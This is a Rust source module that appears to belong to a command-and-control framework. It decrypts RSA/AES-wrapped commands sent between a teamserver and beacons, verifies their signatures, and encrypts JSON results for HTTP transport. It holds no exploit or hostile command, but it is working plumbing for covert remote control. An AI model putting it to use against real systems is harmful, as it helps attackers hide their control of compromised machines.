// Copyright (c) 2024 ThottySploity

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

pub mod listeners;
pub mod mgmt;

use crate::encoding::base64::Base64;
use crate::encryption::rsa::Rsa;
use crate::encryption::aes::Aes;
use crate::utilities::Utils;

use anyhow::{anyhow, Result};
use log::{error};
use rsa::RsaPrivateKey;
use serde_json::{Value, json};

// Retrieving the command of that has been sent, along with the AES key that was used to encrypt it.
pub fn retrieve_command(body: String, private_key: RsaPrivateKey) -> Result<(String, [u8; 32])> {
    let (encrypted_data, encrypted_key, _) = retrieve_info(body)?;
    let decrypted_key = Rsa::decrypt(private_key.clone(), encrypted_key)?;
    let aes_key = Aes::transform(decrypted_key);
    let decrypted_command = Aes::decrypt(aes_key, encrypted_data);
    Ok((Utils::convert(&decrypted_command)?.to_string(), aes_key))
}

// Code for retrieving data from body
pub fn retrieve_info(body: String) -> Result<(Vec<u8>, Vec<u8>, Vec<u8>)> {
    if body.len() > 0 && body.contains(":") {
        let msg: Vec<&str> = body.split(":").collect();

        if msg.len() >= 3 {
            let encrypted_data = Base64::decode(msg[0]).to_vec();
            let encrypted_key = Base64::decode(msg[1]).to_vec();
            let signature = Base64::decode(msg[2]);

            return Ok((encrypted_data, encrypted_key, signature))
        }
    }
    error!("Malformed queue information");
    Err(anyhow!(""))
}

// Code for verifying teamserver and beacon messages
pub fn verify_message(body: String, public_key: &str) -> Result<bool> {
    let (_, encrypted_key, signature) = retrieve_info(body)?;
    let public_key = Rsa::load_public_key(&public_key)?;
    Ok(Rsa::verify(public_key, encrypted_key, &signature))
}

// Code for encoding both commands to send in a JSON format for the Beacon
pub fn encode_in_json(command: String, result: String) -> Value {
    let encoded_response = json!({
        "command": format!("{}", command),
        "result": format!("{}", result),
    });
    encoded_response
}

// Code for encoding the Value of JSON into a final payload ready to be sent over HTTP
pub fn format_payload(input: Value, aes_key: [u8; 32]) -> String {
    if let Ok(encoded_response) = serde_json::to_string(&input) {
        let encrypted_response = Aes::encrypt(aes_key, encoded_response.as_bytes().to_vec());
        let encoded_encrypted_response = Base64::encode(&encrypted_response);
        return encoded_encrypted_response;
    }
    "Failed to format response payload".to_string()
}